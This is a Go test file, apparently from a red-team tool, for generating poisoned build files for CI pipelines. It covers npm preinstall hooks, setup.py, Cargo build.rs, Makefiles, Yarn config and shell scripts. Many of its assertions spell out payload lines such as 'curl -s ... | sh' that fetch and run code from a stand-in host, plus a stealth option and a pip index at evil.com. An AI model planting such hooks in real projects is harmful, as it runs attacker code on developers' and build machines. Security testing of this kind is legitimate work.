// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package lotp

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestEscapeJS(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "hello"},
		{"it's", "it\\'s"},
		{"back\\slash", "back\\\\slash"},
		{"it's a back\\slash", "it\\'s a back\\\\slash"},
		{"", ""},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			assert.Equal(t, tt.expected, escapeJS(tt.input))
		})
	}
}

func TestGeneratePayloadForTechnique_UnknownTool(t *testing.T) {
	result := generatePayloadForTechnique("nonexistent_tool", PayloadOptions{Command: "id"})
	assert.Nil(t, result)
}

func TestGeneratePayloadForTechnique_AllKnownTools(t *testing.T) {
	tools := []string{"npm", "pip", "yarn", "cargo", "make"}
	for _, tool := range tools {
		t.Run(tool, func(t *testing.T) {
			result := generatePayloadForTechnique(tool, PayloadOptions{Command: "id"})
			require.NotNil(t, result)
			assert.Equal(t, tool, result.Technique)
			assert.NotEmpty(t, result.File)
			assert.NotEmpty(t, result.Content)
		})
	}
}

func TestRecommendBestPayload_PriorityOrder(t *testing.T) {
	techniques := []Technique{
		{Name: "make"},
		{Name: "npm"},
	}
	payload := RecommendBestPayload(techniques, PayloadOptions{Command: "id"})
	require.NotNil(t, payload)
	assert.Equal(t, "npm", payload.Technique)
}

func TestRecommendBestPayload_FallbackToFirst(t *testing.T) {
	techniques := []Technique{
		{Name: "docker"},
	}
	payload := RecommendBestPayload(techniques, PayloadOptions{Command: "id"})
	assert.Nil(t, payload)
}

func TestRecommendBestPayload_Empty(t *testing.T) {
	payload := RecommendBestPayload(nil, PayloadOptions{Command: "id"})
	assert.Nil(t, payload)
}

func TestNPMPayload_StealthMode(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{
		Command: "whoami",
		Stealth: true,
	})
	payloads := payload.Generate()

	for _, p := range payloads {
		assert.NotEqual(t, "prepare", p.Properties["hook"],
			"stealth mode should not include prepare hook")
	}
}

func TestNPMPayload_NonStealth_IncludesPrepare(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{
		Command: "whoami",
		Stealth: false,
	})
	payloads := payload.Generate()

	var hasPrepare bool
	for _, p := range payloads {
		if p.Properties["hook"] == "prepare" {
			hasPrepare = true
		}
	}
	assert.True(t, hasPrepare, "non-stealth mode should include prepare hook")
}

func TestNPMPayload_DefaultCommand(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	assert.Contains(t, payloads[0].Content, "id")
}

func TestNPMPayload_PreserveFlow(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{
		Command:      "whoami",
		PreserveFlow: true,
	})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	assert.Contains(t, payloads[0].Content, "|| true")
}

func TestGenerateFiles_NPMUsesRecommendedPayload(t *testing.T) {
	files := GenerateFiles("npm", nil, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 1)
	assert.Equal(t, "package.json", files[0].Path)
	assert.Contains(t, files[0].Content, `"name": "legitimate-package"`)
	assert.Contains(t, files[0].Content, `"preinstall": "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh"`)
	assert.NotContains(t, files[0].Content, "postinstall")
}

func TestGenerateFiles_BashUsesTargets(t *testing.T) {
	files := GenerateFiles("bash", []string{"scripts/build.sh", "scripts/test.sh"}, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 2)
	assert.Equal(t, "scripts/build.sh", files[0].Path)
	assert.Equal(t, "scripts/test.sh", files[1].Path)
	assert.Contains(t, files[0].Content, "#!/bin/sh")
	assert.Contains(t, files[0].Content, "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh")
}

func TestGenerateFiles_PowershellUsesShellWrapper(t *testing.T) {
	files := GenerateFiles("powershell", []string{"scripts/build.ps1"}, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 1)
	assert.Equal(t, "scripts/build.ps1", files[0].Path)
	assert.Contains(t, files[0].Content, "#!/usr/bin/env pwsh")
	assert.Contains(t, files[0].Content, "sh -c 'curl -s ''https://kitchen.example/r/smokedmeat/stg-123'' | sh'")
	assert.NotContains(t, files[0].Content, "Invoke-WebRequest")
}

func TestAutoDeployStatusFor_ActionAlias(t *testing.T) {
	status := AutoDeployStatusFor("", "actions/setup-node")
	assert.True(t, status.Supported)
	assert.Equal(t, "npm", status.Technique)
}

func TestAutoDeployStatusFor_UnsupportedAction(t *testing.T) {
	status := AutoDeployStatusFor("", "actions/setup-go")
	assert.False(t, status.Supported)
	assert.Equal(t, "go", status.Technique)
	assert.Contains(t, status.Reason, "actions/setup-go")
}

func TestGenerateFiles_ActionAliasUsesResolvedTechnique(t *testing.T) {
	files := GenerateFiles("actions/setup-node", nil, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 1)
	assert.Equal(t, "package.json", files[0].Path)
	assert.Contains(t, files[0].Content, `"preinstall": "curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh"`)
}

func TestGenerateFiles_PipUsesCallbackInSetupPy(t *testing.T) {
	files := GenerateFiles("pip", nil, "https://kitchen.example/r/smokedmeat/stg-123")

	require.NotEmpty(t, files)
	assert.Equal(t, "setup.py", files[0].Path)
	assert.Contains(t, files[0].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
}

func TestGenerateFiles_YarnUsesCallback(t *testing.T) {
	files := GenerateFiles("yarn", nil, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 2)
	assert.Equal(t, ".yarnrc.yml", files[0].Path)
	assert.Contains(t, files[1].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
	assert.NotContains(t, files[1].Content, "npx yarn")
}

func TestGenerateFiles_CargoUsesCallback(t *testing.T) {
	files := GenerateFiles("cargo", nil, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 1)
	assert.Equal(t, "build.rs", files[0].Path)
	assert.Contains(t, files[0].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
}

func TestGenerateFiles_MakeUsesCallback(t *testing.T) {
	files := GenerateFiles("make", nil, "https://kitchen.example/r/smokedmeat/stg-123")

	require.Len(t, files, 1)
	assert.Equal(t, "Makefile", files[0].Path)
	assert.Contains(t, files[0].Content, `curl -s 'https://kitchen.example/r/smokedmeat/stg-123' | sh`)
}

func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
	payload := NewNPMPayload(PayloadOptions{
		CallbackURL: "https://kitchen.example/r/smokedmeat/stg123",
	})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	var pkg struct {
		Scripts map[string]string `json:"scripts"`
	}
	require.NoError(t, json.Unmarshal([]byte(payloads[0].Content), &pkg))
	assert.Equal(t, "curl -s 'https://kitchen.example/r/smokedmeat/stg123' | sh", pkg.Scripts["preinstall"])
}

func TestPipPayload_WithCallbackURL(t *testing.T) {
	payload := NewPipPayload(PayloadOptions{
		CallbackURL: "https://evil.com",
	})
	payloads := payload.Generate()

	var hasRequirements bool
	for _, p := range payloads {
		if p.File == "requirements.txt" {
			hasRequirements = true
			assert.Contains(t, p.Content, "-i https://evil.com")
		}
	}
	assert.True(t, hasRequirements, "callback URL should generate requirements.txt")
}

func TestPipPayload_DefaultCommand(t *testing.T) {
	payload := NewPipPayload(PayloadOptions{})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	assert.Contains(t, payloads[0].Content, "id")
}

func TestPipPayload_HasPyprojectToml(t *testing.T) {
	payload := NewPipPayload(PayloadOptions{Command: "whoami"})
	payloads := payload.Generate()

	var hasPyproject bool
	for _, p := range payloads {
		if p.File == "pyproject.toml" {
			hasPyproject = true
			assert.Contains(t, p.Properties["extra_file"], "malicious.py:")
		}
	}
	assert.True(t, hasPyproject, "should have pyproject.toml payload")
}

func TestYarnPayload_HasExtraFile(t *testing.T) {
	payload := NewYarnPayload(PayloadOptions{Command: "id"})
	payloads := payload.Generate()

	require.Len(t, payloads, 1)
	assert.Contains(t, payloads[0].Properties["extra_file"], "pwn.js:")
}

func TestYarnPayload_DefaultCommand(t *testing.T) {
	payload := NewYarnPayload(PayloadOptions{})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	assert.Contains(t, payloads[0].Properties["extra_file"], "id")
}

func TestCargoPayload_DefaultCommand(t *testing.T) {
	payload := NewCargoPayload(PayloadOptions{})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	assert.Contains(t, payloads[0].Content, "id")
}

func TestMakePayload_DefaultCommand(t *testing.T) {
	payload := NewMakePayload(PayloadOptions{})
	payloads := payload.Generate()

	require.NotEmpty(t, payloads)
	assert.Contains(t, payloads[0].Content, "id")
}

func TestDetectAvailableVectors_Deduplication(t *testing.T) {
	files := []string{"package.json"}
	commands := []string{"npm install"}

	techniques := DetectAvailableVectors(files, commands)

	npmCount := 0
	for _, tech := range techniques {
		if tech.Name == "NPM" {
			npmCount++
		}
	}
	assert.Equal(t, 1, npmCount, "NPM should appear only once despite file and command match")
}

func TestDetectAvailableVectors_EmptyInputs(t *testing.T) {
	techniques := DetectAvailableVectors(nil, nil)
	assert.Empty(t, techniques)
}
